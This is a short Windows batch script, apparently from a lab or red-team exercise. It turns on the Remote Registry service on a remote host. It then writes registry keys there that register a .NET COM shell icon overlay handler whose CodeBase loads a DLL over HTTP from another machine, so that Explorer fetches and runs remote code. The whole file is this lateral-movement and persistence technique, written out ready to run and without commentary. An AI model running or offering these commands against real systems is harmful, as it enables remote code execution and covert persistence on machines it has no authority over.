@Echo On
Title Reg For Execute & Color 1A

sc \\ts-user1.enterprise.lab config RemoteRegistry start= auto
sc \\ts-user1.enterprise.lab start RemoteRegistry

Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}" /ve /t REG_SZ /d "ReadOnlyFileIconOverlayHandler" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32" /ve /t REG_SZ /d "mscoree.dll" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32" /v "Assembly" /t REG_SZ /d "ReadOnlyFileIconOverlayHandler, Version=1.0.0.0, Culture=neutral, PublicKeyToken=1aadad2b22ca8c0e" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32" /v "Class" /t REG_SZ /d "ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32" /v "RuntimeVersion" /t REG_SZ /d "v4.0.30319" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32" /v "CodeBase" /t REG_SZ /d "http://ts-dc1.enterprise.lab/ReadOnlyFileIconOverlayHandler.dll" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32\1.0.0.0" /v "Assembly" /t REG_SZ /d "ReadOnlyFileIconOverlayHandler, Version=1.0.0.0, Culture=neutral, PublicKeyToken=1aadad2b22ca8c0e" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32\1.0.0.0" /v "Class" /t REG_SZ /d "ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32\1.0.0.0" /v "RuntimeVersion" /t REG_SZ /d "v4.0.30319" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\CLSID\{a259c04f-ffa8-310b-864c-fe602840399e}\InprocServer32\1.0.0.0" /v "CodeBase" /t REG_SZ /d "http://ts-dc1.enterprise.lab/ReadOnlyFileIconOverlayHandler.dll" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler" /ve /t REG_SZ /d "ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Classes\ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler\CLSID" /ve /t REG_SZ /d "{A259C04F-FFA8-310B-864C-FE602840399E}" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers\  ReadOnlyFileIconOverlayHandler" /ve /t REG_SZ /d "{a259c04f-ffa8-310b-864c-fe602840399e}" /f
Reg.exe add "\\ts-user1.enterprise.lab\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved" /v "{a259c04f-ffa8-310b-864c-fe602840399e}" /t REG_SZ /d "ReadOnlyFileIconOverlayHandler" /f


